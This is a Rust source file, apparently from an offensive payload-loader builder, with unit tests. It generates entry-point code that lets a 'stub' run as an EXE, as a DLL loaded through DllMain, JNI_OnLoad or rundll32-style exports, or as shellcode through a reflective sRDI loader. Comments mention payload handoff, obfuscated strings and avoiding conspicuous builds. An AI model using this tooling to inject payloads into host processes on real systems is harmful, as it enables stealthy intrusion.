//! The stub's entry point (`$ENTRY_BLOCK$`).
//!
//! A `build.output.kind: exe` artifact ends in `fn main()`; a `kind: dll`
//! artifact is loaded by a host process and starts the same chain from an
//! export. Keeping both in one renderer is what lets the builtin template stay
//! entry-agnostic: `fn run()` — and every injected block — has exactly one
//! definition, so the two modes cannot drift apart.
//!
//! The block carries no runtime literals. The export names are ABI data (they
//! necessarily appear in the export directory, see `docs/design/dll-output.md`
//! D-12) and the only message it prints is the chain's own, already obfuscated,
//! error string.

use crate::plan::schema::{ConsoleMode, DllEntry, OutputKind};

/// The executable entry: the chain's exit code is the process's.
pub const EXE_ENTRY: &str = r#"fn main() {
    match run() {
        Ok(code) => std::process::exit(code),
        Err(msg) => {
            eprintln!("{msg}");
            std::process::exit(1);
        }
    }
}
"#;

/// `dll_attach_console` for `build.output.console: parent` (the default):
/// attach the console of the process that loaded this DLL, so the chain's
/// output (and the `build.stub.debug` trace) reaches a terminal instead of
/// nowhere. Best effort: a host without a console runs the chain anyway.
const DLL_ATTACH_CONSOLE_PARENT: &str = r#"/// Attaches the console of the process that loaded this DLL, so the chain's
/// output (and the `build.stub.debug` trace) reaches a terminal instead of
/// nowhere. Best effort: a host without a console runs the chain anyway.
///
/// Called before the first `println!`/`eprintln!`, since the standard library
/// resolves the standard handles once.
fn dll_attach_console() {
    // ATTACH_PARENT_PROCESS: the console of the parent process.
    let _ = unsafe { windows::Win32::System::Console::AttachConsole(u32::MAX) };
}
"#;

/// `dll_attach_console` for `build.output.console: none`: leave the console
/// alone. The chain writes to stdout and the host decides where that goes, so a
/// host that redirects stdout (for example to a named pipe) keeps capturing the
/// output. A no-op kept so the call sites below are identical in both modes.
const DLL_ATTACH_CONSOLE_NONE: &str = r#"/// `build.output.console: none`: leave the console alone. The chain writes to
/// stdout and the host decides where that goes, so a host that redirects stdout
/// (for example to a named pipe) keeps capturing the output.
///
/// A no-op kept so the call sites below are identical in both modes.
fn dll_attach_console() {}
"#;

/// The chain runner and the detached worker: the only place the error path
/// exists, so both exports report the same way. Neither calls
/// `std::process::exit`: the process belongs to the host (`java.exe`,
/// `python.exe`, ...).
const DLL_CHAIN_RUNNER: &str = r#"/// Runs the chain and reports its code. A terminal technique never returns
/// here: it hands the thread to the payload.
fn dll_run_chain() -> i32 {
    match run() {
        Ok(code) => code,
        Err(msg) => {
            eprintln!("{msg}");
            1
        }
    }
}

/// Runs the chain on a worker thread and returns at once, so the host's loader
/// is never blocked and a terminal technique keeps the thread it was given.
/// DLL builds use `panic=unwind`: a panic ends the chain, not the host.
fn dll_run_detached() {
    dll_attach_console();
    let _ = std::thread::spawn(|| {
        let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(dll_run_chain));
    });
}
"#;

/// `DllMain`: the chain never runs here. `DllMain` is called under the loader
/// lock, and every execution technique loads a module (the payload's imports,
/// `api-ms-*`), which is the classic deadlock shape.
const DLL_DLLMAIN: &str = r#"/// `DllMain`: the attach notification only drops the per-thread notifications
/// the host would otherwise deliver for every thread it creates.
#[allow(non_snake_case)]
#[no_mangle]
pub extern "system" fn DllMain(
    hinstance: *mut core::ffi::c_void,
    reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    // DLL_PROCESS_ATTACH.
    if reason == 1 {
        let _ = unsafe {
            windows::Win32::System::LibraryLoader::DisableThreadLibraryCalls(
                windows::Win32::Foundation::HMODULE(hinstance),
            )
        };
    }
    1
}
"#;

/// `JNI_OnLoad`: what `System.load` calls.
///
/// It starts the chain on a worker thread and returns the JNI version at once,
/// so the JVM keeps its own thread and owns the process lifetime (the host must
/// stay alive long enough — a `main` that loads the DLL and returns kills the
/// chain; see `docs/design/dll-output.md` section 4.3).
const DLL_JNI_ONLOAD: &str = r#"/// `JNI_OnLoad`: starts the chain and returns to the JVM at once.
#[allow(non_snake_case)]
#[no_mangle]
pub extern "system" fn JNI_OnLoad(
    _vm: *mut core::ffi::c_void,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    dll_run_detached();
    // JNI_VERSION_1_6.
    0x0001_0006
}
"#;

/// The plain export (`export:<name>` / `auto`'s `Run`).
///
/// It waits for the chain and returns its code, so a short-lived host
/// (`rundll32` exits as soon as the export returns) does not tear the worker
/// down. The four arguments are the shape `rundll32` calls with: on x86
/// `extern "system"` is `stdcall`, so the callee must pop exactly what the
/// caller pushed. Every other host may pass none — on x64 the extra argument
/// slots are simply ignored.
fn export_entry(name: &str, shellcode: bool) -> String {
    let restore = if shellcode {
        // A shellcode stub runs on a thread whose TLS array is the stub's
        // private one; the guard puts the loader's array back when the chain
        // finishes or unwinds, so the host thread's teardown sees its own.
        "    let _restore = crate::tls_handoff::RestoreGuard::new();\n"
    } else {
        ""
    };
    format!(
        r#"/// `{name}`: what a host calls to run the chain. Returns the chain's code.
#[allow(non_snake_case)]
#[no_mangle]
pub extern "system" fn {name}(
    _hwnd: *mut core::ffi::c_void,
    _hinstance: *mut core::ffi::c_void,
    _cmdline: *const u8,
    _show: i32,
) -> i32 {{
    dll_attach_console();
{restore}    dll_run_chain()
}}
"#
    )
}

/// Renders the entry block for the requested output kind.
pub fn render(kind: OutputKind, entry: &DllEntry, console: ConsoleMode) -> String {
    match kind {
        OutputKind::Exe => EXE_ENTRY.to_string(),
        // Shellcode wraps the same DLL: the reflective loader (sRDI) maps it and
        // calls the plain export after `DllMain`, so the entry block is identical
        // except for the TLS restore guard the shellcode export carries.
        OutputKind::Dll | OutputKind::Shellcode => {
            render_dll(entry, console, kind == OutputKind::Shellcode)
        }
        // A psmodule build never renders the Rust entry block (it is compiled
        // from generated C#); the placeholder keeps the match total.
        OutputKind::PsModule => String::new(),
    }
}

/// Renders the DLL entry: the shared helpers plus the exports the entry asks
/// for.
///
/// `DllMain` is always emitted — it is the export an ordinary DLL has, and the
/// one place the host's thread notifications are dropped. What makes a build
/// conspicuous is a chain-runner export *next to* `JNI_OnLoad` (`entry: auto`),
/// not `DllMain` itself.
fn render_dll(entry: &DllEntry, console: ConsoleMode, shellcode: bool) -> String {
    let mut out = String::new();
    out.push_str("// --- Entry (build.output.kind: dll) ---\n");
    out.push_str(match console {
        ConsoleMode::Parent => DLL_ATTACH_CONSOLE_PARENT,
        ConsoleMode::None => DLL_ATTACH_CONSOLE_NONE,
    });
    out.push('\n');
    out.push_str(DLL_CHAIN_RUNNER);
    out.push('\n');
    out.push_str(DLL_DLLMAIN);
    if entry.exports_jni_on_load() {
        out.push('\n');
        out.push_str(DLL_JNI_ONLOAD);
    }
    if let Some(name) = entry.export_name() {
        out.push('\n');
        out.push_str(&export_entry(name, shellcode));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_exe_entry_is_the_single_binary_entry_point() {
        assert_eq!(
            render(OutputKind::Exe, &DllEntry::Auto, ConsoleMode::Parent),
            EXE_ENTRY
        );
        assert!(EXE_ENTRY.contains("fn main()"));
        assert!(EXE_ENTRY.contains("std::process::exit(code)"));
    }

    #[test]
    fn a_dll_entry_never_calls_process_exit() {
        for entry in [
            DllEntry::Auto,
            DllEntry::JniOnLoad,
            DllEntry::Export("Go".to_string()),
        ] {
            let block = render(OutputKind::Dll, &entry, ConsoleMode::Parent);
            assert!(
                !block.contains("process::exit"),
                "the host owns the process: {block}"
            );
            assert!(!block.contains("fn main("), "a DLL has no main: {block}");
            assert!(block.contains("fn DllMain"), "DllMain is always exported");
        }
    }

    #[test]
    fn auto_exports_every_entry_point() {
        let block = render(OutputKind::Dll, &DllEntry::Auto, ConsoleMode::Parent);
        assert!(block.contains("fn JNI_OnLoad"));
        assert!(block.contains("fn Run"));
        assert!(block.contains("JNI_VERSION_1_6"));
    }

    #[test]
    fn jni_on_load_alone_does_not_export_a_plain_runner() {
        let block = render(OutputKind::Dll, &DllEntry::JniOnLoad, ConsoleMode::Parent);
        assert!(block.contains("fn JNI_OnLoad"));
        assert!(!block.contains("fn Run("));
    }

    #[test]
    fn an_explicit_export_name_is_used_verbatim() {
        let block = render(
            OutputKind::Dll,
            &DllEntry::Export("StartChain".to_string()),
            ConsoleMode::Parent,
        );
        assert!(block.contains("fn StartChain("));
        assert!(!block.contains("fn Run("));
        assert!(!block.contains("fn JNI_OnLoad"));
    }

    #[test]
    fn the_plain_export_takes_the_rundll32_shape_and_blocks() {
        let block = render(
            OutputKind::Dll,
            &DllEntry::Export("Run".to_string()),
            ConsoleMode::Parent,
        );
        for parameter in ["_hwnd", "_hinstance", "_cmdline", "_show"] {
            assert!(block.contains(parameter), "missing {parameter}: {block}");
        }
        // The blocking call, not the detached one: `rundll32` exits when the
        // export returns.
        assert!(block.contains("dll_run_chain()"), "the export must wait");
    }

    #[test]
    fn the_detached_worker_catches_panics() {
        let block = render(OutputKind::Dll, &DllEntry::Auto, ConsoleMode::Parent);
        assert!(block.contains("std::panic::catch_unwind"));
        assert!(block.contains("std::thread::spawn"));
        // The console is attached before the first print of the new thread.
        assert!(block.contains("AttachConsole"));
    }

    #[test]
    fn shellcode_entry_adds_only_the_tls_restore_guard() {
        // Shellcode wraps the packed DLL, so it reuses the DLL entry block; the
        // only difference is the TLS restore guard the shellcode export carries
        // (its thread runs on a private TLS array the stub provisioned).
        let entry = DllEntry::Export("Run".to_string());
        let dll = render(OutputKind::Dll, &entry, ConsoleMode::Parent);
        let shellcode = render(OutputKind::Shellcode, &entry, ConsoleMode::Parent);
        assert_eq!(
            shellcode,
            dll.replace(
                "    dll_run_chain()",
                "    let _restore = crate::tls_handoff::RestoreGuard::new();\n    dll_run_chain()"
            ),
            "the shellcode export must only add the restore guard"
        );
        let auto = render(OutputKind::Shellcode, &DllEntry::Auto, ConsoleMode::Parent);
        assert!(!auto.contains("fn main("), "shellcode has no main: {auto}");
        assert!(
            auto.contains("fn Run("),
            "the loader needs a plain export: {auto}"
        );
    }

    #[test]
    fn parent_console_emits_attachconsole() {
        // `parent` (and the absence of the field, which deserializes to the
        // default) is the current behavior: the console attach is emitted so the
        // chain's output reaches the host's terminal.
        for console in [ConsoleMode::Parent, ConsoleMode::default()] {
            let block = render(OutputKind::Dll, &DllEntry::Auto, console);
            assert!(
                block.contains("AttachConsole"),
                "parent must attach: {block}"
            );
        }
    }

    #[test]
    fn none_console_does_not_emit_attachconsole() {
        // `none` skips the attach: the chain writes to stdout and the host
        // decides where that goes, so no `AttachConsole` call may appear.
        let block = render(OutputKind::Dll, &DllEntry::Auto, ConsoleMode::None);
        assert!(
            !block.contains("AttachConsole"),
            "none must not attach: {block}"
        );
        assert!(
            block.contains("fn dll_run_chain"),
            "the runner stays: {block}"
        );
    }
}
